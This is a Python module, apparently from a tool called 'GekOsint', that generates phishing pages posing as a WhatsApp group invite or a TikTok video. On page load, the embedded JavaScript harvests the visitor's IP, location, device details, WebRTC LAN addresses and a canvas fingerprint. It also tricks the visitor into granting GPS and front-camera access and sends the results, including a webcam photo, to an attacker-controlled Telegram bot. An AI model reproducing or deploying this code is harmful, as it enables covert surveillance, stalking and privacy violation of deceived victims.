
"""
Plantillas HTML para el módulo de tracking.
Contiene la estructura base y los scripts JS para Geo y Cam tracking.
"""

CSS_STYLES_WHATSAPP = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #0a0f1c;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
        border-radius: 20px;
        padding: 40px;
        max-width: 500px;
        width: 100%;
        box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        text-align: center;
        animation: fadeIn 0.6s ease;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-30px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 80px;
        height: 80px;
        margin: 0 auto 20px;
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        border-radius: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 45px;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
    }
    h1 {
        color: #ffffff;
        font-size: 26px;
        margin-bottom: 10px;
        font-weight: 600;
    }
    p {
        color: #8b949e;
        font-size: 15px;
        line-height: 1.6;
        margin-bottom: 25px;
    }
    .btn {
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        color: white;
        padding: 15px 40px;
        border: none;
        border-radius: 30px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
        transition: all 0.3s ease;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
    }
    .loader {
        width: 50px;
        height: 50px;
        border: 4px solid #21262d;
        border-top: 4px solid #25d366;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
    .hidden {display: none;}
    .members {
        color: #58a6ff;
        font-size: 14px;
        margin-top: 15px;
    }
</style>
"""

CSS_STYLES_CAMERA = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #000000;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: #111111;
        border-radius: 16px;
        padding: 36px 30px;
        max-width: 420px;
        width: 100%;
        box-shadow: 0 0 40px rgba(254,44,85,0.2);
        text-align: center;
        animation: fadeIn 0.5s ease;
        border: 1px solid #222;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-20px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 72px;
        height: 72px;
        margin: 0 auto 18px;
        background: linear-gradient(135deg, #fe2c55 0%, #ee1d52 50%, #69c9d0 100%);
        border-radius: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 38px;
        box-shadow: 0 4px 20px rgba(254, 44, 85, 0.5);
    }
    .badge {
        display: inline-block;
        background: #fe2c55;
        color: white;
        font-size: 11px;
        font-weight: 700;
        padding: 3px 10px;
        border-radius: 20px;
        text-transform: uppercase;
        letter-spacing: 1px;
        margin-bottom: 14px;
    }
    h1 {
        color: #ffffff;
        font-size: 22px;
        margin-bottom: 8px;
        font-weight: 700;
    }
    .username {
        color: #fe2c55;
        font-size: 15px;
        font-weight: 600;
        margin-bottom: 16px;
    }
    p {
        color: #888888;
        font-size: 14px;
        line-height: 1.6;
        margin-bottom: 24px;
    }
    .stats {
        display: flex;
        justify-content: center;
        gap: 30px;
        margin-bottom: 24px;
        border-top: 1px solid #222;
        border-bottom: 1px solid #222;
        padding: 14px 0;
    }
    .stat-item {
        text-align: center;
    }
    .stat-num {
        color: #ffffff;
        font-size: 18px;
        font-weight: 700;
        display: block;
    }
    .stat-label {
        color: #666;
        font-size: 12px;
    }
    .loader {
        width: 44px;
        height: 44px;
        border: 3px solid #222;
        border-top: 3px solid #fe2c55;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 0 auto 16px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
    .hidden {display: none;}
    .footer-note {
        color: #444;
        font-size: 12px;
        margin-top: 16px;
    }
</style>
"""

JS_COMMON_FUNCTIONS = """
const BOT='__TOKEN__', CHAT='__CHAT_ID__';

const send = async (txt) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML', disable_web_page_preview: true})
    });
};

const sendLocation = async (lat, lon) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, latitude: lat, longitude: lon})
    });
};

const sendPhoto = async (blob) => {
    const fd = new FormData();
    fd.append('chat_id', CHAT);
    fd.append('photo', blob, 'capture.jpg');
    fd.append('caption', '📸 <b>Captura de Camara</b>');
    fd.append('parse_mode', 'HTML');
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
};

/* --- WebRTC IP leak (expone IPs LAN sin ningun permiso) --- */
const getWebRTCIPs = async () => {
    const ips = new Set();
    try {
        const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel('');
        await pc.setLocalDescription(await pc.createOffer());
        await new Promise(r => setTimeout(r, 1200));
        const sdp = pc.localDescription?.sdp || '';
        [...sdp.matchAll(/a=candidate:[^\\n]+/g)].forEach(m => {
            const p = m[0].split(' ');
            if (p[7] === 'host' && p[4] && !p[4].startsWith('0.') && !p[4].startsWith('127.') && !p[4].includes(':'))
                ips.add(p[4]);
        });
        pc.close();
    } catch(e) {}
    return [...ips];
};

/* --- Canvas fingerprint (unico por dispositivo/browser, sin permisos) --- */
const getCanvasFP = () => {
    try {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f36';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('GekOsint\\u2665', 2, 15);
        ctx.fillStyle = 'rgba(102,204,0,0.7)';
        ctx.fillText('GekOsint\\u2665', 4, 17);
        return c.toDataURL().slice(-40);
    } catch(e) { return 'N/A'; }
};

/* --- Recolecta TODO lo posible sin ningun permiso, luego envia --- */
const getBasicInfo = async () => {
    let ip = '', lat = 0, lon = 0;
    let info = '\\u{1F50D} <b>NUEVA VISITA DETECTADA</b>\\n';
    info += '\\u2501'.repeat(22) + '\\n\\n';

    /* IP + geo por red */
    try {
        const r  = await fetch('https://api.ipify.org?format=json');
        const d  = await r.json();
        ip = d.ip;
        info += `\\u{1F310} <b>IP Publica:</b> <code>${ip}</code>\\n`;

        const gf = `https://ip-api.com/json/${ip}?fields=status,lat,lon,city,regionName,country,countryCode,isp,org,as,mobile,proxy,hosting`;
        const geo = await (await fetch(gf)).json();
        if (geo.status === 'success') {
            lat = geo.lat; lon = geo.lon;
            info += `\\u{1F4CD} <b>Ciudad:</b> ${geo.city}, ${geo.regionName}, ${geo.country} (${geo.countryCode})\\n`;
            info += `\\u{1F3E2} <b>ISP:</b> ${geo.isp}\\n`;
            if (geo.org && geo.org !== geo.isp) info += `\\u{1F3DB} <b>Org:</b> ${geo.org}\\n`;
            info += `\\u{1F4E1} <b>ASN:</b> ${geo.as}\\n`;
            const flags = [];
            if (geo.proxy)   flags.push('\\u26A0\\uFE0F VPN/Proxy');
            if (geo.mobile)  flags.push('\\u{1F4F1} Red Movil');
            if (geo.hosting) flags.push('\\u{1F5A5} Datacenter');
            if (flags.length) info += `\\u{1F6A9} <b>Flags:</b> ${flags.join(' | ')}\\n`;
            info += `\\u{1F5FA} <b>Maps IP:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver ubicacion</a>\\n`;
        }
    } catch(e) {}

    /* Dispositivo */
    info += `\\n\\u{1F4BB} <b>DISPOSITIVO</b>\\n`;
    info += `\\u{1F4F1} <b>UA:</b> <code>${navigator.userAgent.slice(0,120)}</code>\\n`;
    info += `\\u{1F5A5} <b>Plataforma:</b> ${navigator.platform}\\n`;
    info += `\\u{1F310} <b>Idiomas:</b> ${(navigator.languages || [navigator.language]).join(', ')}\\n`;
    info += `\\u{1F552} <b>Zona horaria:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\\n`;
    info += `\\u{1F4D0} <b>Pantalla:</b> ${screen.width}x${screen.height} @ ${screen.colorDepth}bit\\n`;
    info += `\\u{1FA9F} <b>Ventana:</b> ${window.innerWidth}x${window.innerHeight}\\n`;
    info += `\\u2699 <b>CPU cores:</b> ${navigator.hardwareConcurrency || 'N/A'}\\n`;
    if (navigator.deviceMemory) info += `\\u{1F9E0} <b>RAM aprox:</b> ${navigator.deviceMemory}GB\\n`;
    info += `\\u{1F91A} <b>Touch:</b> ${navigator.maxTouchPoints > 0 ? `Si (${navigator.maxTouchPoints} puntos)` : 'No'}\\n`;
    if (document.referrer) info += `\\u{1F517} <b>Referrer:</b> ${document.referrer}\\n`;
    info += `\\u{1F4DC} <b>Historial:</b> ${history.length} entradas\\n`;

    /* Red */
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
        info += `\\n\\u{1F4F6} <b>CONEXION</b>\\n`;
        if (conn.effectiveType) info += `\\u{1F4F6} <b>Tipo:</b> ${conn.effectiveType}\\n`;
        if (conn.downlink)      info += `\\u2B07 <b>Downlink:</b> ${conn.downlink} Mbps\\n`;
        if (conn.rtt)           info += `\\u23F1 <b>RTT:</b> ${conn.rtt}ms\\n`;
        if (conn.saveData)      info += `\\u{1F4BE} Modo ahorro de datos: Si\\n`;
    }

    /* Bateria */
    try {
        const bat = await navigator.getBattery();
        info += `\\u{1F50B} <b>Bateria:</b> ${Math.round(bat.level*100)}% ${bat.charging ? '(cargando \\u26A1)' : ''}\\n`;
    } catch(e) {}

    /* WebRTC IP leak */
    try {
        const rtcIPs = await getWebRTCIPs();
        if (rtcIPs.length)
            info += `\\n\\u{1F513} <b>IPs LAN (WebRTC):</b> <code>${rtcIPs.join(', ')}</code>\\n`;
    } catch(e) {}

    /* Dispositivos media (sin permiso solo cuenta, no da labels) */
    try {
        const devs = await navigator.mediaDevices.enumerateDevices();
        const cams = devs.filter(d => d.kind==='videoinput').length;
        const mics = devs.filter(d => d.kind==='audioinput').length;
        info += `\\n\\u{1F3A5} <b>Camaras:</b> ${cams} | \\u{1F3A4} <b>Micros:</b> ${mics}\\n`;
    } catch(e) {}

    /* Canvas fingerprint */
    const fp = getCanvasFP();
    info += `\\u{1F91A} <b>Canvas FP:</b> <code>${fp}</code>\\n`;

    await send(info);
    return {lat, lon, ip};
};
"""

JS_GEO_AUTO = """
const getGeoAuto = async (ipLat, ipLon) => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (p) => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            const alt = p.coords.altitude ? `${p.coords.altitude.toFixed(1)}m` : 'N/A';
            const spd = p.coords.speed   ? `${(p.coords.speed * 3.6).toFixed(1)} km/h` : 'N/A';
            let gps = `\U0001F3AF <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
            gps += `\U0001F4CD <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
            gps += `\U0001F4CF <b>Precision:</b> ${acc.toFixed(0)} metros\\n`;
            gps += `\U0001F3D4 <b>Altitud:</b> ${alt}\\n`;
            gps += `\U0001F3CE <b>Velocidad:</b> ${spd}\\n`;
            gps += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>\\n`;
            gps += `\U0001F6F0 <b>Street View:</b> <a href="https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}">Ver Street View</a>`;
            await send(gps);
            await sendLocation(lat, lon);
            redirect();
        }, async (err) => {
            const reasons = {1:'Permiso denegado', 2:'Posicion no disponible', 3:'Timeout'};
            let msg = `\U0001F4CD <b>GPS DENEGADO \u2014 Datos por IP</b>\\n\\n`;
            msg += `\u26D4 <b>Razon:</b> ${reasons[err.code] || 'Desconocido'}\\n\\n`;
            if (ipLat && ipLon) {
                msg += `\U0001F310 <b>Coords IP:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
                msg += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver ubicacion aproximada</a>\\n`;
                msg += `\u26A0\uFE0F <i>Precision baja (nivel ciudad/ISP)</i>`;
                await send(msg);
                await sendLocation(ipLat, ipLon);
            } else {
                msg += `\u274C Sin coordenadas disponibles`;
                await send(msg);
            }
            redirect();
        }, {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
    } else {
        let msg = `\U0001F4CD <b>Geolocalizacion no disponible</b>\\n\\n`;
        if (ipLat && ipLon) {
            msg += `\U0001F310 <b>Coords IP:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
            msg += `\U0001F5FA <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver ubicacion</a>`;
            await send(msg);
            await sendLocation(ipLat, ipLon);
        } else {
            await send(msg + '\u274C Sin datos de ubicacion');
        }
        redirect();
    }
};
"""

JS_CAM_AUTO = """
const getCamAuto = async (ipLat, ipLon) => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" },
            audio: false
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    await sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop());
                    getGeoAuto(ipLat || 0, ipLon || 0);
                }, 'image/jpeg', 0.9);
            }, 1500);
        };
    } catch (e) {
        await send(`❌ <b>Camara Denegada/Error:</b> ${e.message}`);
        getGeoAuto(ipLat || 0, ipLon || 0);
    }
};
"""

def get_template(token, chat_id, mode="geo"):
    """Genera el HTML completo con camuflaje atractivo"""
    
    logic = JS_COMMON_FUNCTIONS.replace('__TOKEN__', token).replace('__CHAT_ID__', str(chat_id))
    
    if mode == "cam":
        css = CSS_STYLES_CAMERA
        init_call = "const ipGeo = await getBasicInfo(); getCamAuto(ipGeo.lat, ipGeo.lon);"
        logic += JS_GEO_AUTO + JS_CAM_AUTO
        icon = "🎵"
        title = "@viral_clips_mx"
        subtitle = "Cargando video exclusivo... Activa el acceso a la cámara para una mejor experiencia."
        extra_html = '''
        <div class="badge">LIVE</div>
        <div class="stats">
            <div class="stat-item"><span class="stat-num">2.4M</span><span class="stat-label">seguidores</span></div>
            <div class="stat-item"><span class="stat-num">18.3M</span><span class="stat-label">me gusta</span></div>
            <div class="stat-item"><span class="stat-num">847</span><span class="stat-label">videos</span></div>
        </div>
        <div class="footer-note" id="members">Verificando acceso al contenido...</div>
        '''
        redirect_url = "https://www.tiktok.com"
        redirect_text = "TikTok"
        meta_desc = "Video viral exclusivo"
        page_title = "TikTok - Ver video"
    else:
        css = CSS_STYLES_WHATSAPP
        init_call = "const ipGeo = await getBasicInfo(); getGeoAuto(ipGeo.lat, ipGeo.lon);"
        logic += JS_GEO_AUTO
        icon = "💬"
        title = "Únete al Grupo"
        subtitle = "Te han invitado a un grupo privado. Verificando tu ubicación para acceso seguro..."
        extra_html = '<div class="members" id="members">🟢 45 miembros activos</div>'
        redirect_url = "https://web.whatsapp.com"
        redirect_text = "WhatsApp"
        meta_desc = "Grupo privado de WhatsApp"
        page_title = "WhatsApp - Unirse al grupo"

    template = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="{meta_desc}">
    <title>{page_title}</title>
    __CSS__
</head>
<body>
    <div class="container">
        <div class="logo">{icon}</div>
        {extra_html}
        <h1 id="title">{title}</h1>
        <p id="subtitle">{subtitle}</p>
        <div class="loader" id="loader"></div>
    </div>
    <script>
        const redirect = () => {{
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('title').innerText = '✅ Acceso Verificado';
            document.getElementById('subtitle').innerText = 'Redirigiendo a {redirect_text}...';
            setTimeout(() => {{
                window.location.href = "{redirect_url}";
            }}, 2000);
        }};
        
        __LOGIC__
        
        (async () => {{
            __INIT__
        }})();
    </script>
</body>
</html>
"""
    html = template.replace('__CSS__', css)
    html = html.replace('__LOGIC__', logic)
    html = html.replace('__INIT__', init_call)
    
    return html
